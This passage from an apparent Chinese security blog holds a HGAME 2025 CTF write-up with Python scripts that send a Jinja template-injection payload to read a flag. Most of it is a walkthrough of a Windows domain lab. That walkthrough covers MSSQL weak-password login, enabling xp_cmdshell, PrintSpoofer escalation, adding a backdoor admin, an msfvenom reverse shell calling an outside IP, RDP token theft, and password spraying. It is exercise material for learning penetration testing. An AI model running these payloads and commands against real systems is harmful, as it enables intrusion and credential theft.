\u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p 